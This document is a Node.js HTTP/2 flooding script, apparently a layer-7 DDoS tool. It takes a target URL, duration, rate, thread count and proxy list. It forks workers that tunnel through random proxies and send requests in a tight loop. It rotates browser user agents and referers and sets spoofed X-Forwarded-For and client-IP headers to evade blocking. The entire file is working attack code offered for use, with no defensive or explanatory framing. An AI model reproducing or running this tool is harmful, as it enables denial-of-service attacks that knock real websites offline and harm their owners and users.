const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const logFile = fs.createWriteStream('error.log', { flags: 'a' });

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    tlsSocket: process.argv.includes('--tlssocket') ? process.argv[process.argv.indexOf('--tlssocket') + 1] === 'true' : false
};

if (cluster.isMaster) {  
  for (let i = 1; i <= args.threads; i++) {
    cluster.fork();
  }
  setInterval(getStatus, 2000);
  setTimeout(() => {
    process.exit(1);
  }, args.time * 1000);

  cluster.on('exit', (worker, code, signal) => {
    logError(`Worker ${worker.process.pid} died. Code: ${code}, Signal: ${signal}`);
    logError('Starting a new worker...');
    cluster.fork();
  });

} else {
  setInterval(runFlooder, 0);
}

function logError(message) {
    logFile.write(`${new Date().toISOString()} - ERROR: ${message}\n`);
    console.error(message);
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const ip_spoof = () => {
    const ip_segment = () => Math.floor(Math.random() * 255);
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
};
const fakeIP = ip_spoof();

const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-CHACHA20-POLY1305'
];

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512'
];

const httpmethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];
const refers = [
    'https://www.google.com/search?q=',
    'https://www.bing.com/search?q=',
    'https://search.yahoo.com/search?p=',
    'https://duckduckgo.com/?q=',
    'https://www.check-host.net/',
];

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/117.0.2045.31',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/95.0.0.0 Safari/537.36'
];

function handleQuery(query) {
    return query;
}

class NetSocket {
    constructor() {}

    HTTP(options, callback, retries = 3) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
        }, () => {
            connection.write(buffer);
        });

        connection.on('data', (data) => {
            if (data.toString().includes("200 Connection established")) {
                callback(connection, null);
            } else {
                if (retries > 0) {
                    logError(`Failed to connect to proxy, retrying... (${retries} attempts left)`);
                    setTimeout(() => this.HTTP(options, callback, retries - 1), 1000);
                } else {
                    callback(null, new Error("Failed to connect after multiple attempts"));
                }
            }
        });

        connection.on('error', (error) => {
            logError(`Connection error: ${error.message}`);
            if (retries > 0) {
                setTimeout(() => this.HTTP(options, callback, retries - 1), 1000);
            } else {
                callback(null, error);
            }
        });

        connection.on('timeout', () => {
            logError('Connection timeout');
            connection.destroy();
        });
    }
}

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

function getRandomReferer() {
    return refers[Math.floor(Math.random() * refers.length)];
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

const headers = {
    ":method": httpmethods[Math.floor(Math.random() * httpmethods.length)],
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": parsedTarget.path + (args.query ? `?${handleQuery(args.query)}` : ""),
    "user-agent": getRandomUserAgent(),
    "accept": 'application/json, text/plain, */*',
    "accept-language": 'en-US,en;q=0.9',
    "accept-encoding": 'gzip, deflate, br',
    "cache-control": Math.random() < 0.4 ? "max-age=0" : undefined,
    "content-length": args.method === "POST" ? "0" : undefined,
    "sec-ch-ua": '"Chromium";v="91", "Not;A Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
    "sec-fetch-site": Math.random() < 0.5 ? "none" : undefined,
    "sec-fetch-mode": Math.random() < 0.5 ? "navigate" : undefined,
    "sec-fetch-user": Math.random() < 0.5 ? "?1" : undefined,
    "sec-fetch-dest": Math.random() < 0.5 ? "document" : undefined,
    "referer": getRandomReferer(),
    "via": fakeIP,
    "x-forwarded-for": fakeIP,
    "x-forwarded-host": fakeIP,
    "client-ip": fakeIP,
    "real-ip": fakeIP,
};

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

    process.on('uncaughtException', (err) => {
        if (err.code === 'EPIPE') {
            logError(`EPIPE error: ${err.message}`);
        } else {
            logError(`Uncaught Exception: ${err.message}`);
        }
    });

    process.on('unhandledRejection', (reason, promise) => {
        logError(`Unhandled Rejection: ${reason}`);
    });

    const Socker = new NetSocket();

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: ciphers.join(':') + ':ALL',
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3
        };

        const tlsConn = tls.connect(tlsOptions, () => {
            if (tlsConn.authorized) {
                const client = http2.connect(`https://${parsedTarget.host}`, { createConnection: () => tlsConn });
                client.on('error', (err) => logError(`HTTP/2 client error: ${err.message}`));
                const req = client.request(headers);
                req.on('response', (headers, flags) => {
                });
                req.end();
            } else {
                logError('TLS connection unauthorized');
                tlsConn.destroy();
            }
        });

        tlsConn.on('error', (err) => {
            logError(`TLS error: ${err.message}`);
        });
    });
}

function getStatus() {
//add sendiri cik
}

process.on('SIGINT', () => {
    logError('Process terminated, shutting down workers...');
    for (const id in cluster.workers) {
        cluster.workers[id].kill('SIGTERM');
    }
    process.exit(0);
});
